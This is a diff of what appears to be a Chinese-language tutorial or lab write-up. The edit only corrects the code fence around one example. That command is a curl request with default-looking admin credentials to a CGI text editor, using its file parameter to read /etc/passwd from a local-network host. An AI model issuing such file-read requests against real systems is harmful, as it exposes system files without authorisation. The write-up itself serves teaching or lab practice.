@@ -18,6 +18,6 @@
 
 有关文件下载还可以使用其他方法，比如:
 
-'''
+```
 curl -s -H "Authorization: Basic YWRtaW46MTIzNDU=" http://192.168.123.9/cgi-bin/texteditor.cgi?f=/etc/passwd | htmlq -t .small
-'''
+```
